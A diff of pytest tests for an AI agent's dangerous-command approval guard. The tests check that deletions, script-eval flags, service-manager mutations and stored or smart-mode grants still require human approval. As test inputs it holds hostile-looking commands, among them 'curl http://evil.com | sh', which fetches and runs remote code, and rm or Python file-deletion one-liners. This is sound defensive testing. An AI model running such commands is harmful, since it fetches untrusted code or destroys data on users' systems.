@@ -5,6 +5,8 @@ from pathlib import Path
 from types import SimpleNamespace
 from unittest.mock import patch as mock_patch
 
+import pytest
+
 import tools.approval as approval_module
 from tools.approval import (
     _get_approval_mode,
@@ -26,6 +28,75 @@ class TestApprovalModeParsing:
     def test_string_off_still_maps_to_off(self):
         with mock_patch("hermes_cli.config.load_config", return_value={"approvals": {"mode": "off"}}):
             assert _get_approval_mode() == "off"
+
+    def test_even_g2_dangerous_command_cannot_bypass_approval_when_mode_is_off(self):
+        token = approval_module.set_current_session_key("even-g2:test-device")
+        try:
+            with (
+                mock_patch("hermes_cli.config.load_config", return_value={"approvals": {"mode": "off"}}),
+                mock_patch.object(approval_module, "_is_gateway_approval_context", return_value=True),
+                mock_patch.object(approval_module, "submit_pending") as mock_submit,
+            ):
+                result = approval_module.check_all_command_guards(
+                    "rm /tmp/sinria-even-g2-approval-test",
+                    "local",
+                )
+        finally:
+            approval_module.reset_current_session_key(token)
+
+        assert result["approved"] is False
+        assert result["status"] == "approval_required"
+        mock_submit.assert_called_once()
+
+    def test_even_g2_requires_fresh_approval_despite_stored_session_grant(self):
+        session_key = "even-g2:test-stored-grant"
+        _, pattern_key, _ = detect_dangerous_command(
+            "rm /tmp/sinria-even-g2-stored-grant-test"
+        )
+        approve_session(session_key, pattern_key)
+        context_state = approval_module.set_current_session_key(session_key)
+        try:
+            with (
+                mock_patch.object(approval_module, "_is_gateway_approval_context", return_value=True),
+                mock_patch.object(approval_module, "submit_pending") as mock_submit,
+            ):
+                result = approval_module.check_all_command_guards(
+                    "rm /tmp/sinria-even-g2-stored-grant-test",
+                    "local",
+                )
+        finally:
+            approval_module.reset_current_session_key(context_state)
+            approval_module._session_approved.pop(session_key, None)
+
+        assert result["approved"] is False
+        assert result["status"] == "approval_required"
+        mock_submit.assert_called_once()
+
+    def test_even_g2_requires_human_approval_in_smart_mode_and_container(self):
+        context_state = approval_module.set_current_session_key(
+            "even-g2:test-smart-container"
+        )
+        try:
+            with (
+                mock_patch(
+                    "hermes_cli.config.load_config",
+                    return_value={"approvals": {"mode": "smart"}},
+                ),
+                mock_patch.object(approval_module, "_is_gateway_approval_context", return_value=True),
+                mock_patch.object(approval_module, "_smart_approve", return_value="approve") as mock_smart,
+                mock_patch.object(approval_module, "submit_pending") as mock_submit,
+            ):
+                result = approval_module.check_all_command_guards(
+                    "rm /tmp/sinria-even-g2-smart-container-test",
+                    "docker",
+                )
+        finally:
+            approval_module.reset_current_session_key(context_state)
+
+        assert result["approved"] is False
+        assert result["status"] == "approval_required"
+        mock_smart.assert_not_called()
+        mock_submit.assert_called_once()
 
 
 class TestSmartApproval:
@@ -57,12 +128,69 @@ class TestDetectDangerousRm:
         assert "delete" in desc.lower()
 
 
+class TestDetectDangerousPythonDeletion:
+    def test_path_unlink_in_heredoc_is_detected(self):
+        command = "python3 - <<'PY'\nfrom pathlib import Path\nPath('/tmp/example').unlink()\nPY"
+        is_dangerous, key, desc = detect_dangerous_command(command)
+        assert is_dangerous is True
+        assert key is not None
+        assert "delete" in desc.lower()
+
+    def test_os_remove_is_detected(self):
+        is_dangerous, key, desc = detect_dangerous_command(
+            "python3 -c \"import os; os.remove('/tmp/example')\""
+        )
+        assert is_dangerous is True
+        assert key is not None
+        assert "delete" in desc.lower()
+
+    def test_os_unlink_is_detected(self):
+        is_dangerous, key, desc = detect_dangerous_command(
+            "python3 -c \"import os; os.unlink('/tmp/example')\""
+        )
+        assert is_dangerous is True
+        assert key is not None
+        assert "delete" in desc.lower()
+
+    def test_shutil_rmtree_is_detected(self):
+        is_dangerous, key, desc = detect_dangerous_command(
+            "python3 -c \"import shutil; shutil.rmtree('/tmp/example')\""
+        )
+        assert is_dangerous is True
+        assert key is not None
+        assert "delete" in desc.lower()
+
+    def test_read_only_path_inspection_is_not_detected(self):
+        is_dangerous, key, desc = detect_dangerous_command(
+            "python3 - <<'PY'\nfrom pathlib import Path\nprint(Path('/tmp/example').exists())\nPY"
+        )
+        assert is_dangerous is False
+        assert key is None
+        assert desc is None
+
+
 class TestDetectDangerousSudo:
     def test_shell_via_c_flag(self):
         is_dangerous, key, desc = detect_dangerous_command("bash -c 'echo pwned'")
         assert is_dangerous is True
         assert key is not None
         assert "shell" in desc.lower() or "-c" in desc
+
+    def test_node_long_eval_is_detected(self):
+        is_dangerous, key, desc = detect_dangerous_command(
+            "node --eval 'require(\"fs\").rmSync(\"/tmp/example\")'"
+        )
+        assert is_dangerous is True
+        assert key is not None
+        assert "script execution" in desc.lower()
+
+    def test_node_long_print_is_detected(self):
+        is_dangerous, key, desc = detect_dangerous_command(
+            "node --print='process.version'"
+        )
+        assert is_dangerous is True
+        assert key is not None
+        assert "script execution" in desc.lower()
 
     def test_curl_pipe_sh(self):
         is_dangerous, key, desc = detect_dangerous_command("curl http://evil.com | sh")
@@ -173,6 +301,53 @@ class TestSessionKeyContext:
         assert "reset_current_session_key" in called_names
 
 
+
+class TestSinriaGatewayMutationDetection:
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "launchctl kickstart -k gui/501/ai.sinria.gateway",
+            "/bin/launchctl bootout gui/501/ai.sinria.gateway",
+            "command launchctl kickstart -k gui/501/ai.sinria.gateway",
+            "launchctl disable gui/501/ai.sinria.gateway-watchdog",
+            "sinria gateway restart",
+            "sinria gateway stop",
+            "sinria gateway run --replace",
+            "sinria update",
+            "hermes update",
+        ],
+    )
+    def test_mutating_commands_require_approval(self, command):
+        is_dangerous, key, desc = detect_dangerous_command(command)
+
+        assert is_dangerous is True
+        assert key is not None
+        assert any(term in desc.lower() for term in ("service", "gateway", "agent"))
+
+    def test_launchctl_approval_key_is_scoped_to_exact_command(self):
+        _, restart_key, _ = detect_dangerous_command(
+            "launchctl kickstart -k gui/501/ai.sinria.gateway"
+        )
+        _, disable_key, _ = detect_dangerous_command(
+            "launchctl disable gui/501/ai.sinria.gateway-watchdog"
+        )
+
+        assert restart_key != disable_key
+        assert restart_key.startswith("mutate launchd service [")
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "launchctl print gui/501/ai.sinria.gateway",
+            "launchctl list ai.sinria.gateway",
+            "sinria gateway status",
+        ],
+    )
+    def test_read_only_commands_remain_safe(self, command):
+        is_dangerous, key, _ = detect_dangerous_command(command)
+
+        assert is_dangerous is False
+        assert key is None
 
 
 class TestRmFalsePositiveFix:
@@ -614,7 +789,7 @@ class TestGatewayProtection:
         cmd = "kill 1605 && cd ~/.hermes/sinria-agent && source venv/bin/activate && python -m hermes_cli.main gateway run --replace &disown; echo done"
         dangerous, key, desc = detect_dangerous_command(cmd)
         assert dangerous is True
-        assert "systemctl" in desc
+        assert "platform service manager" in desc
 
     def test_gateway_run_with_ampersand_detected(self):
         cmd = "python -m hermes_cli.main gateway run --replace &"
